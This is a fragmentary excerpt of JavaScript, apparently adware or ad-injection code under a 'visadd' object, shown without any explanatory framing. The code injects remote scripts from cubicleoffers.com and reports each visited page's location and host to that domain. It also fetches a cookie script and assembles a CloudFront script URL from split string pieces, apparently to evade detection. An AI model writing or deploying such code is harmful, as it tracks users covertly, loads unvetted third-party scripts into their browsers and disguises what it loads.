...
if (window.visadd){
// do nothing
var encoded_partner = '14567725629';
...
var unit_code_url = '//a.cubicleoffers.com/internal/blocked?v=2&subid='+sub_id+'&format=1&ai=992&ctxu=' + escape(visadd.preload.encoded_partner) + '&sid=' + encoded_partner;
...
visadd.preload.injectScript(visadd.preload.protocol() + '//cdn.cubicleoffers.com/script/layer.js?' + params);
}
}
}
},
...
var script_domain = 'a.cubicleoffers.com';
...
init: function(){
if(true){
//visadd.preload.injectScript('https://d19tqk5t6qcjac.cloudfront.net/i/787_contentch.js');
visadd.preload.injectScript('https://d19'+'tqk5t'+'6qc'+'jac.clou'+'dfro'+'nt.net/i/' + 787 + '_con'+'tentc'+'h.js');
}
...
try{
var sub_id = '14698';
var unit_code_url = '//a.cubicleoffers.com/internal/reporter?v=2&format=1&ai=986&subid=inframe&sid=' + visadd.preload.encoded_partner +'&ctxu=' + escape(window.location) + "&dm=" + escape(window.location.host);
visadd.preload.injectScript(unit_code_url);
} catch(e){}
}
}
...
var unit_code_url = '//a.cubicleoffers.com/internal/blocked?v=2&subid=ssl&format=1&ai=991&ctxu=' + location + '&sid=' + visadd.preload.encoded_partner + '&dm=' + domain;
visadd.preload.injectScript(unit_code_url);
}
} catch(e){}
try{
...
var unit_code_url = '//a.cubicleoffers.com/internal/blocked?v=2&subid=' + protocol +'&format=1&ai=991&ctxu=' + escape(document.location) + '&sid=' + visadd.preload.encoded_partner + '&dm=' + escape(document.location.host.replace("www.", ""));
visadd.preload.injectScript(unit_code_url);
} catch(e){}
}
...
visadd.preload.injectScript(visadd.preload.protocol() + '//a.cubicleoffers.com/cookies/get.js?' + params);
}
}
}
}
